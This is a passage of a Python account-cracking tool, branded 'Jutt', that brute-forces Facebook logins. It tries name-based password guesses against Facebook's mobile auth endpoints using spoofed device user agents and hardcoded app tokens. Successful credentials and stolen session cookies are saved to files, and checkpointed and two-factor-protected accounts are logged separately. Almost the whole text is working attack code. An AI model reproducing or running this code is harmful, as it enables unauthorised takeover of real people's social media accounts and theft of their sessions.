                        li2 = random.choice(li)
                        j1 = ''.join(random.choice(digits) for _ in range(2))
                        jazoest = li2+j1
                        data={"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email":ids,"password":pas,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_BD","client_country_code": "BD","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
                        headers = {"Content-Type": "application/x-www-form-urlencoded","Host": "graph.facebook.com","User-Agent":ua,"X-FB-Net-HNI": "45204","X-FB-SIM-HNI": "45201","X-FB-Connection-Type": "MOBILE.LTE","X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice","Accept-Encoding": "gzip, deflate","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62","Connection": "Keep-Alive"}
                        url = 'https://b-graph.facebook.com/auth/login'
                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        print('\r\r\033[1;32m [Jutt-OK] '+ids+' | '+pas+'\033[1;97m')
                                        cek_apk(session,coki)
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                      #  print("\r\r\033[1;33m Cookie: "+coki)
                                        open('/sdcard/Jutt-COKIE.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/Jutt-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r \033[1;34m[Jutt-2F] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print('\r\r\x1b[38;5;205m [Jutt-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/Jutt-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                                        else:
                                                open('/sdcard/Jutt-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                        else:
                                        continue
                loop+=1
        except Exception as e:
                pass
  #method3             
def api2(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write('\r\r\033[1;37m [Jutt-M2] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                        ln = fn
                for pw in passlist:
                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                        #i3 = f"[FBAN/FB4A;FBAV/{random.randint(200,435)}.0.0.{random.randint(11,99)}.{fbhlfend};FBBV/{fbbv};[FBAN/{FBAN};FBAV/{random.randint(200,435)}.0.0.{random.randint(11,99)}.{fbhlfend};FBBV/{fbbv};FBDM/"+"{"+f"density={density},width={width},height={height};FBLC/en_US;FBCR/{FBCR};FBMF/Realme;FBBD/Realme;FBDV/{reamodels};FBSV/{andver};FBCA/armeabi-v7a:armeabi;]"
                        ############ USER AGENT ###################
                        FBLC = random.choice(['id_ID', 'ur_PK', 'bd_BD', 'fr_FR','it_IT', 'ar_SD', 'en_US', 'es_MX', 'nl_NL'])
                        FBAN = random.choice(['FB4A', 'Orca-Android'])
                        FBCR = random.choice(["null","Null","Zong","Ufone","Telenor","PK-UFONE","Jazz"])
                        FBSV = random.choice(['4', '5', '6', '7', '8', '9', '10', '11', '12'])
                        facebook_version = f'{random.randint(10,436)}.0.0.{random.randint(11,99)}.{random.randint(1,250)}'
                        facebookv = f'{random.randint(10,436)}.0.0.{random.randint(11,99)}.{random.randint(1,250)}'
                        fbhlfend = random.choice(["199","477","129","66","375","247","201","236","129","70","116","186","169","118","120","123","121","112","107","117","124","119","127","125","109","127","111","117","118","115","241"])
                        fbbv = str(random.randint(11111111, 99999999))
                        fbrv = str(random.randint(11111111, 99999999))
                        density = random.choice(["2.0","2.25","2.75","3.0","3.25","3.75"])
                        width = random.randint(720, 1440)
                        height = random.randint(1080, 2560)
                        sim = random.choice(['null', 'Null', 'Zong', 'Ufone', 'Telenor', 'PK-UFONE', 'Jazz'])
                        andver = random.choice(['4', '5', '6', '7', '8', '9', '10', '11', '12', ' 13'])
                        country = (['en_US', 'en_GB', 'pt_BR', 'ko_KR', 'ex_MX', 'it_IT', 'np_NP'])
                        fbaan = random.choice(['FB4A', 'Orca-Android'])
                        fbweb = random.choice(['com.facebook.katana', 'com.facebook.orca', 'com.facebook.lite', 'com.facebook.mlite'])
                        fbpn = random.choice(['com.facebook.katana', 'com.facebook.orca'])
                        ##################  ___  DEVICE NAME AND HIS REAL VERSIONS__  ##################
                        y1 = 'FBDV/POT-AL00a;FBSV/9.0'
                        y2 = 'FBDV/M886;FBSV/4.0.3'
                        y3 = 'FBDV/HUAWEI AQUA Y2;FBSV/4.4.2'
                        y4 = 'FBDV/HUAWEI-M920;FBSV/2.3.6'
                        y5 = 'FBDV/Huawei Ascend;FBSV/2.3.8'
                        y6 = 'FBDV/HUAWEI-M921;FBSV/2.3.6'
                        y7 = 'FBDV/U9500;FBSV/4.0.3'
                        y8 = 'FBDV/HUAWEI-M931;FBSV/4.0.4'
                        y9 = 'FBDV/HUAWEI Z100-UL00;FBSV/4.4.2'
                        y10 = 'FBDV/RIO-AL00;FBSV/5.1'
                        y11 = 'FBDV/HUAWEI Ascend G;FBSV/4.0.3'
                        y12 = 'FBDV/MLA-L01;FBSV/6.0.1'
                        y13 = 'FBDV/HUAWEI Ascend G;FBSV/4.0.4'
                        y14 = 'FBDV/U8818;FBSV/2.3.6'
                        y15 = 'FBDV/TNN-AN00;FBSV/10'
                        y16 = 'FBDV/G510-0200;FBSV/4.1'
                        y17 = 'FBDV/HUAWEI Mate 20 lite;FBSV/10'
                        y18 = 'FBDV/G525-U00;FBSV/4.1'
                        y19 = 'FBDV/G525-U00;FBSV/8.1'
                        y20 = 'FBDV/G527-U081;FBSV/4.1'
                        y21 = 'FBDV/RNE-L21;FBSV/7.0'
                        y22 = 'FBDV/G6-U00;FBSV/4.3'
                        y23 = 'FBDV/BLA-L29;FBSV/8.0'
                        y24 = 'FBDV/G6-L11;FBSV/4.3'
                        y25 = 'FBDV/HMA-L29;FBSV/9.0'
                        y26 = 'FBDV/SNE-AL00;FBSV/8.1'
                        y27 = 'FBDV/G620S-L01;FBSV/4.4.2'
                        y28 = 'FBDV/LYA-L09;FBSV/9.0'
                        y29 = 'FBDV/G630-U10;FBSV/4.3'
                        y30 = 'FBDV/LYA-L09;FBSV/9.0'
                        y31 = 'FBDV/G7-L01;FBSV/4.4.2'
                        y32 = 'FBDV/EVR-L29;FBSV/9.0'
                        y33 = 'FBDV/G700-U10;FBSV/4.2'
                        y34 = 'FBDV/TAS-L09;FBSV/10'
                        y35 = 'FBDV/G730-U10;FBSV/4.2'
                        y36 = 'FBDV/TAS-AN00;FBSV/10'
                        y37 = 'FBDV/MT1-U06;FBSV/4.1.2'
                        y38 = 'FBDV/SPL-AL00;FBSV/9.0'
                        y39 = 'FBDV/MT1-U06;FBSV/4.1'
                        y40 = 'FBDV/LIO-L09;FBSV/10'
                        yes = random.choice([y1,y2,y3,y4,y5,y6,y7,y8,y9,y10,y11,y12,y13,y14,y15,y16,y17,y18,y19,y20,y21,y22,y23,y24,y25,y26,y27,y28,y29,y30,y31,y32,y33,y34,y35,y36,y37,y38,y39,y40])
                        e = f"[FBAN/FB4A;FBAV/{facebookv};FBBV/{fbbv};"
                        u1 = f"[FBAN/Orca-Android;FBAV/{facebook_version};FBBV/{fbbv};FBRV/{fbrv};FBPN/com.facebook.orca;FBLC/en_BD;FBCR/{FBCR};FBMF/HUAWEI;FBBD/HUAWEI;{yes};FBCA/arm64-v8a:null;FBDM/"+""+f"density={density},width={width},height={height};FB_FW/1;]"
                        u2 = f"[FBAN/FB4A;FBAV/{facebook_version};FBBV/{fbbv};FBRV/{fbrv};FBPN/{fbweb};FBLC/en_BD;FBCR/{FBCR};FBMF/HUAWEI;FBBD/HUAWEI;{yes};nullFBCA/armeabi-v7a:armeabi;FBDM/"+""+f"density={density},width={width},height={height};FB_FW/1;]"
                        x1 = e + u1
                        x2 = e + u2
                        ua = random.choice([x1,x2])
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
                        family = str(uuid.uuid4())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        xd =str(''.join(random_seed.choices(string.digits, k=20)))
                        sim_serials = f'["{xd}"]'
                        li = ['28','29','210']
                        li2 = random.choice(li)
                        j1 = ''.join(random.choice(digits) for _ in range(2))
                        jazoest = li2+j1
                        data = {
                                "adid": adid,
"format": "json",
"device_id": str(uuid.uuid4()),
"email": ids,
"password": pas,
"generate_analytics_claims": "1",
"credentials_type": "password",
"source": "login",
"error_detail_type": "button_with_disabled",
"enroll_misauth": "false",
"generate_session_cookies": "1",
"generate_machine_id": "1",
"fb_api_req_friendly_name": "authenticate",}
                        headers={
                                "Accept-Encoding": "gzip, deflate",
"Accept": "*/*",
"Connection": "keep-alive",
"User-Agent":ua,
"Authorization": "OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32",
"X-FB-Friendly-Name": "authenticate",
"X-FB-Connection-Type": "unknown",
"Content-Type": "application/x-www-form-urlencoded",
"X-FB-HTTP-Engine": "Liger",
"Content-Length": "329",}
                        url = 'https://b-graph.facebook.com/auth/login'
                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        print('\r\r\033[1;32m [Jutt-OK] '+ids+' | '+pas+'\033[1;97m')
                                        cek_apk(session,coki)
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                      #  print("Cookie: "+coki)
                                        open('/sdcard/Jutt-COOKIE.txt','a').write(coki+'\n')
                                        open('/sdcard/Jutt-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r \033[1;34m[Jutt-2F] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print('\r\r\x1b[38;5;205m [Jutt-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/Jutt-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                                        else:
                                                open('/sdcard/Jutt-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                        else:
                                        continue
                loop+=1
        except Exception as e:
                pass
#b-api method
#method3                
def api3(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write('\r\r\033[1;37m [Jutt-M3] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                        ln = fn
                for pw in passlist:
                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                        #i3 = f"[FBAN/FB4A;FBAV/{random.randint(200,435)}.0.0.{random.randint(11,99)}.{fbhlfend};FBBV/{fbbv};[FBAN/{FBAN};FBAV/{random.randint(200,435)}.0.0.{random.randint(11,99)}.{fbhlfend};FBBV/{fbbv};FBDM/"+"{"+f"density={density},width={width},height={height};FBLC/en_US;FBCR/{FBCR};FBMF/Realme;FBBD/Realme;FBDV/{reamodels};FBSV/{andver};FBCA/armeabi-v7a:armeabi;]"
                        ############ USER AGENT ###################
                        FBLC = random.choice(['id_ID', 'ur_PK', 'bd_BD', 'fr_FR','it_IT', 'ar_SD', 'en_US', 'es_MX', 'nl_NL'])
                        FBAN = random.choice(['FB4A', 'Orca-Android'])
                        FBCR = random.choice(["null","Null","Zong","Ufone","Telenor","PK-UFONE","Jazz"])
                        FBSV = random.choice(['4', '5', '6', '7', '8', '9', '10', '11', '12'])
                        facebook_version = f'{random.randint(10,436)}.0.0.{random.randint(11,99)}.{random.randint(1,250)}'
                        facebookv = f'{random.randint(10,436)}.0.0.{random.randint(11,99)}.{random.randint(1,250)}'
                        fbhlfend = random.choice(["199","477","129","66","375","247","201","236","129","70","116","186","169","118","120","123","121","112","107","117","124","119","127","125","109","127","111","117","118","115","241"])
                        fbbv = str(random.randint(11111111, 99999999))
                        fbrv = str(random.randint(11111111, 99999999))
                        density = random.choice(["2.0","2.25","2.75","3.0","3.25","3.75"])
                        width = random.randint(720, 1440)
                        height = random.randint(1080, 2560)
                        sim = random.choice(['null', 'Null', 'Zong', 'Ufone', 'Telenor', 'PK-UFONE', 'Jazz'])
                        andver = random.choice(['4', '5', '6', '7', '8', '9', '10', '11', '12', ' 13'])
                        country = (['en_US', 'en_GB', 'pt_BR', 'ko_KR', 'ex_MX', 'it_IT', 'np_NP'])
                        fbaan = random.choice(['FB4A', 'Orca-Android'])
                        fbweb = random.choice(['com.facebook.katana', 'com.facebook.orca', 'com.facebook.lite', 'com.facebook.mlite'])
                        fbpn = random.choice(['com.facebook.katana', 'com.facebook.orca'])
                        ##################  ___  DEVICE NAME AND HIS REAL VERSIONS__  ##################
                        y1 = 'FBDV/POT-AL00a;FBSV/9.0'
                        y2 = 'FBDV/M886;FBSV/4.0.3'
                        y3 = 'FBDV/HUAWEI AQUA Y2;FBSV/4.4.2'
                        y4 = 'FBDV/HUAWEI-M920;FBSV/2.3.6'
                        y5 = 'FBDV/Huawei Ascend;FBSV/2.3.8'
                        y6 = 'FBDV/HUAWEI-M921;FBSV/2.3.6'
                        y7 = 'FBDV/U9500;FBSV/4.0.3'
                        y8 = 'FBDV/HUAWEI-M931;FBSV/4.0.4'
                        y9 = 'FBDV/HUAWEI Z100-UL00;FBSV/4.4.2'
                        y10 = 'FBDV/RIO-AL00;FBSV/5.1'
                        y11 = 'FBDV/HUAWEI Ascend G;FBSV/4.0.3'
                        y12 = 'FBDV/MLA-L01;FBSV/6.0.1'
                        y13 = 'FBDV/HUAWEI Ascend G;FBSV/4.0.4'
                        y14 = 'FBDV/U8818;FBSV/2.3.6'
                        y15 = 'FBDV/TNN-AN00;FBSV/10'
                        y16 = 'FBDV/G510-0200;FBSV/4.1'
                        y17 = 'FBDV/HUAWEI Mate 20 lite;FBSV/10'
                        y18 = 'FBDV/G525-U00;FBSV/4.1'
                        y19 = 'FBDV/G525-U00;FBSV/8.1'
                        y20 = 'FBDV/G527-U081;FBSV/4.1'
                        y21 = 'FBDV/RNE-L21;FBSV/7.0'
                        y22 = 'FBDV/G6-U00;FBSV/4.3'
                        y23 = 'FBDV/BLA-L29;FBSV/8.0'
                        y24 = 'FBDV/G6-L11;FBSV/4.3'
                        y25 = 'FBDV/HMA-L29;FBSV/9.0'
                        y26 = 'FBDV/SNE-AL00;FBSV/8.1'
                        y27 = 'FBDV/G620S-L01;FBSV/4.4.2'
                        y28 = 'FBDV/LYA-L09;FBSV/9.0'
                        y29 = 'FBDV/G630-U10;FBSV/4.3'
                        y30 = 'FBDV/LYA-L09;FBSV/9.0'
                        y31 = 'FBDV/G7-L01;FBSV/4.4.2'
                        y32 = 'FBDV/EVR-L29;FBSV/9.0'
                        y33 = 'FBDV/G700-U10;FBSV/4.2'
                        y34 = 'FBDV/TAS-L09;FBSV/10'
                        y35 = 'FBDV/G730-U10;FBSV/4.2'
                        y36 = 'FBDV/TAS-AN00;FBSV/10'
                        y37 = 'FBDV/MT1-U06;FBSV/4.1.2'
                        y38 = 'FBDV/SPL-AL00;FBSV/9.0'
                        y39 = 'FBDV/MT1-U06;FBSV/4.1'
                        y40 = 'FBDV/LIO-L09;FBSV/10'
                        yes = random.choice([y1,y2,y3,y4,y5,y6,y7,y8,y9,y10,y11,y12,y13,y14,y15,y16,y17,y18,y19,y20,y21,y22,y23,y24,y25,y26,y27,y28,y29,y30,y31,y32,y33,y34,y35,y36,y37,y38,y39,y40])
                        e = f"[FBAN/FB4A;FBAV/{facebookv};FBBV/{fbbv};"
                        u1 = f"[FBAN/Orca-Android;FBAV/{facebook_version};FBBV/{fbbv};FBRV/{fbrv};FBPN/com.facebook.orca;FBLC/en_BD;FBCR/{FBCR};FBMF/HUAWEI;FBBD/HUAWEI;{yes};FBCA/arm64-v8a:null;FBDM/"+""+f"density={density},width={width},height={height};FB_FW/1;]"
                        u2 = f"[FBAN/FB4A;FBAV/{facebook_version};FBBV/{fbbv};FBRV/{fbrv};FBPN/{fbweb};FBLC/en_BD;FBCR/{FBCR};FBMF/HUAWEI;FBBD/HUAWEI;{yes};nullFBCA/armeabi-v7a:armeabi;FBDM/"+""+f"density={density},width={width},height={height};FB_FW/1;]"
                        x1 = e + u1
                        x2 = e + u2
                        ua = random.choice([x1,x2])
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
                        family = str(uuid.uuid4())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        xd =str(''.join(random_seed.choices(string.digits, k=20)))
                        sim_serials = f'["{xd}"]'
                        li = ['28','29','210']
                        li2 = random.choice(li)
                        j1 = ''.join(random.choice(digits) for _ in range(2))
                        jazoest = li2+j1
                        data = {
                                'adid':adid,
                                'format':'json',
                                'device_id':device_id,
                                'email':ids,
                                'password':pas,
                                'generate_analytics_claims':'1',
                                'credentials_type':'password',
                                'source':'login',
                                'error_detail_type':'button_with_disabled',
                                'enroll_misauth':'false',
                                'generate_session_cookies':'1',
                                'generate_machine_id':'1',
                                'meta_inf_fbmeta':'',
                                'currently_logged_in_userid':'0',
                                'fb_api_req_friendly_name':'authenticate',
                        }
                        headers={
                                'Authorization':f'OAuth {accessToken}',
                                'X-FB-Friendly-Name':'authenticate',
                                'X-FB-Connection-Type':'unknown',
                                'User-Agent':ua,
                                'Accept-Encoding':'gzip, deflate',
                                'Content-Type': 'application/x-www-form-urlencoded',
                                'X-FB-HTTP-Engine': 'Liger'
                                }
                        url = 'https://b-api.facebook.com/method/auth.login'
                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        print('\r\r\033[1;32m [Jutt-OK] '+ids+' | '+pas+'\033[1;97m')
                                        cek_apk(session,coki)
                                        open('/sdcard/Jutt-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r \033[1;34m[Jutt-2F] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
                        elif 'www.facebook.com' in po['error_msg']:
                                        if 'y' in pcp:
                                                print('\r\r\x1b[38;5;206m [Jutt-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/Jutt-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                                        else:
                                                open('/sdcard/Jutt-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                        else:
                                continue
                loop+=1
        except Exception as e:
                pass

#method1rnd
def Jutt1(ids,passlist):
        global loop
        global oks
        sys.stdout.write('\r\r\033[1;37m [Jutt-M1] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                	    #i3 = f"[FBAN/FB4A;FBAV/{random.randint(200,435)}.0.0.{random.randint(11,99)}.{fbhlfend};FBBV/{fbbv};[FBAN/{FBAN};FBAV/{random.randint(200,435)}.0.0.{random.randint(11,99)}.{fbhlfend};FBBV/{fbbv};FBDM/"+"{"+f"density={density},width={width},height={height};FBLC/en_US;FBCR/{FBCR};FBMF/Realme;FBBD/Realme;FBDV/{reamodels};FBSV/{andver};FBCA/armeabi-v7a:armeabi;]"
                        ############ USER AGENT ###################
                        FBLC = random.choice(['id_ID', 'ur_PK', 'bd_BD', 'fr_FR','it_IT', 'ar_SD', 'en_US', 'es_MX', 'nl_NL'])
                        FBAN = random.choice(['FB4A', 'Orca-Android'])
                        FBCR = random.choice(["null","Null","Zong","Ufone","Telenor","PK-UFONE","Jazz"])
                        FBSV = random.choice(['4', '5', '6', '7', '8', '9', '10', '11', '12'])
                        facebook_version = f'{random.randint(10,436)}.0.0.{random.randint(11,99)}.{random.randint(1,250)}'
                        facebookv = f'{random.randint(10,436)}.0.0.{random.randint(11,99)}.{random.randint(1,250)}'
                        fbhlfend = random.choice(["199","477","129","66","375","247","201","236","129","70","116","186","169","118","120","123","121","112","107","117","124","119","127","125","109","127","111","117","118","115","241"])
                        fbbv = str(random.randint(11111111, 99999999))
                        fbrv = str(random.randint(11111111, 99999999))
                        density = random.choice(["2.0","2.25","2.75","3.0","3.25","3.75"])
                        width = random.randint(720, 1440)
                        height = random.randint(1080, 2560)
                        sim = random.choice(['null', 'Null', 'Zong', 'Ufone', 'Telenor', 'PK-UFONE', 'Jazz'])
                        andver = random.choice(['4', '5', '6', '7', '8', '9', '10', '11', '12', ' 13'])
                        country = (['en_US', 'en_GB', 'pt_BR', 'ko_KR', 'ex_MX', 'it_IT', 'np_NP'])
                        fbaan = random.choice(['FB4A', 'Orca-Android'])
                        fbweb = random.choice(['com.facebook.katana', 'com.facebook.orca', 'com.facebook.lite', 'com.facebook.mlite'])
                        fbpn = random.choice(['com.facebook.katana', 'com.facebook.orca'])
                        ##################  ___  DEVICE NAME AND HIS REAL VERSIONS__  ##################
                        y1 = 'FBDV/POT-AL00a;FBSV/9.0'
                        y2 = 'FBDV/M886;FBSV/4.0.3'
                        y3 = 'FBDV/HUAWEI AQUA Y2;FBSV/4.4.2'
                        y4 = 'FBDV/HUAWEI-M920;FBSV/2.3.6'
                        y5 = 'FBDV/Huawei Ascend;FBSV/2.3.8'
                        y6 = 'FBDV/HUAWEI-M921;FBSV/2.3.6'
                        y7 = 'FBDV/U9500;FBSV/4.0.3'
                        y8 = 'FBDV/HUAWEI-M931;FBSV/4.0.4'
                        y9 = 'FBDV/HUAWEI Z100-UL00;FBSV/4.4.2'
                        y10 = 'FBDV/RIO-AL00;FBSV/5.1'
                        y11 = 'FBDV/HUAWEI Ascend G;FBSV/4.0.3'
                        y12 = 'FBDV/MLA-L01;FBSV/6.0.1'
                        y13 = 'FBDV/HUAWEI Ascend G;FBSV/4.0.4'
                        y14 = 'FBDV/U8818;FBSV/2.3.6'
                        y15 = 'FBDV/TNN-AN00;FBSV/10'
                        y16 = 'FBDV/G510-0200;FBSV/4.1'
                        y17 = 'FBDV/HUAWEI Mate 20 lite;FBSV/10'
                        y18 = 'FBDV/G525-U00;FBSV/4.1'
                        y19 = 'FBDV/G525-U00;FBSV/8.1'
                        y20 = 'FBDV/G527-U081;FBSV/4.1'
                        y21 = 'FBDV/RNE-L21;FBSV/7.0'
                        y22 = 'FBDV/G6-U00;FBSV/4.3'
                        y23 = 'FBDV/BLA-L29;FBSV/8.0'
                        y24 = 'FBDV/G6-L11;FBSV/4.3'
                        y25 = 'FBDV/HMA-L29;FBSV/9.0'
                        y26 = 'FBDV/SNE-AL00;FBSV/8.1'
                        y27 = 'FBDV/G620S-L01;FBSV/4.4.2'
                        y28 = 'FBDV/LYA-L09;FBSV/9.0'
                        y29 = 'FBDV/G630-U10;FBSV/4.3'
                        y30 = 'FBDV/LYA-L09;FBSV/9.0'
                        y31 = 'FBDV/G7-L01;FBSV/4.4.2'
                        y32 = 'FBDV/EVR-L29;FBSV/9.0'
                        y33 = 'FBDV/G700-U10;FBSV/4.2'
                        y34 = 'FBDV/TAS-L09;FBSV/10'
                        y35 = 'FBDV/G730-U10;FBSV/4.2'
                        y36 = 'FBDV/TAS-AN00;FBSV/10'
                        y37 = 'FBDV/MT1-U06;FBSV/4.1.2'
                        y38 = 'FBDV/SPL-AL00;FBSV/9.0'
                        y39 = 'FBDV/MT1-U06;FBSV/4.1'
                        y40 = 'FBDV/LIO-L09;FBSV/10'
                        yes = random.choice([y1,y2,y3,y4,y5,y6,y7,y8,y9,y10,y11,y12,y13,y14,y15,y16,y17,y18,y19,y20,y21,y22,y23,y24,y25,y26,y27,y28,y29,y30,y31,y32,y33,y34,y35,y36,y37,y38,y39,y40])
                        e = f"[FBAN/FB4A;FBAV/{facebookv};FBBV/{fbbv};"
                        u1 = f"[FBAN/Orca-Android;FBAV/{facebook_version};FBBV/{fbbv};FBRV/{fbrv};FBPN/com.facebook.orca;FBLC/en_BD;FBCR/{FBCR};FBMF/HUAWEI;FBBD/HUAWEI;{yes};FBCA/arm64-v8a:null;FBDM/"+""+f"density={density},width={width},height={height};FB_FW/1;]"
                        u2 = f"[FBAN/FB4A;FBAV/{facebook_version};FBBV/{fbbv};FBRV/{fbrv};FBPN/{fbweb};FBLC/en_BD;FBCR/{FBCR};FBMF/HUAWEI;FBBD/HUAWEI;{yes};nullFBCA/armeabi-v7a:armeabi;FBDM/"+""+f"density={density},width={width},height={height};FB_FW/1;]"
                        x1 = e + u1
                        x2 = e + u2
                        ua = random.choice([x1,x2])
                        data = {
                                "adid": adid,
"format": "json",
"device_id": str(uuid.uuid4()),
"cpl": "true",
"family_device_id": str(uuid.uuid4()),
"credentials_type": "device_based_login_password",
"error_detail_type": "button_with_disabled",
"source": "device_based_login",
"email": ids,
"password": pas,
"access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
"generate_session_cookies": "1",
"meta_inf_fbmeta": "",
"advertiser_id": "8b59ed89-4b88-4f69-a1ed-dfea59e76839",
"currently_logged_in_userid": "0",
"locale": "en_BD",
"client_country_code": "BD",
"method": "auth.login",
"fb_api_req_friendly_name": "authenticate",
"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
"api_key": "882a8490361da98702bf97a021ddc14d",}
                        headers={
                                'User-Agent': ua,
'Content-Type': 'application/x-www-form-urlencoded',
'Host': 'graph.facebook.com',
'X-FB-Net-HNI': '45204',
'X-FB-SIM-HNI': '45201',
'X-FB-Connection-Type': 'MOBILE.LTE',
'X-Tigon-Is-Retry': 'False',
'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
'x-fb-device-group': '5120',
'X-FB-Friendly-Name': 'ViewerReactionsMutation',
'X-FB-Request-Analytics-Tags': 'graphservice',
'X-FB-HTTP-Engine': 'Liger',
'X-FB-Client-IP': 'True',
'X-FB-Server-Cluster': 'True',
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',
'Content-Length': '698'}
                        url = 'https://b-graph.facebook.com/auth/login'
                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                try:
                                        uid = po['uid']
                                except:
                                        uid = ids
                                if str(uid) in oks:
                                        break
                                else:
                                        print('\r\r\033[1;32m [Jutt-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        cek_apk(session,coki)
                                        open('/sdcard/Jutt-rnd-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                try:
                                        uid = po['error']['error_data']['uid']
                                except:
                                        uid = ids
                                if uid in oks:pass
                                else:
                                        #print('\r\r\x1b[38;5;205m [Jutt-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/Jutt-rnd-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
        except Exception as e:
                pass

#new method
                
def Jutt2(ids,passlist):
        global loop
        global oks
        sys.stdout.write('\r\r\033[1;37m [Jutt-M2] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                	    #i3 = f"[FBAN/FB4A;FBAV/{random.randint(200,435)}.0.0.{random.randint(11,99)}.{fbhlfend};FBBV/{fbbv};[FBAN/{FBAN};FBAV/{random.randint(200,435)}.0.0.{random.randint(11,99)}.{fbhlfend};FBBV/{fbbv};FBDM/"+"{"+f"density={density},width={width},height={height};FBLC/en_US;FBCR/{FBCR};FBMF/Realme;FBBD/Realme;FBDV/{reamodels};FBSV/{andver};FBCA/armeabi-v7a:armeabi;]"
                        ############ USER AGENT ###################
                        FBLC = random.choice(['id_ID', 'ur_PK', 'bd_BD', 'fr_FR','it_IT', 'ar_SD', 'en_US', 'es_MX', 'nl_NL'])
                        FBAN = random.choice(['FB4A', 'Orca-Android'])
                        FBCR = random.choice(["null","Null","Zong","Ufone","Telenor","PK-UFONE","Jazz"])
                        FBSV = random.choice(['4', '5', '6', '7', '8', '9', '10', '11', '12'])
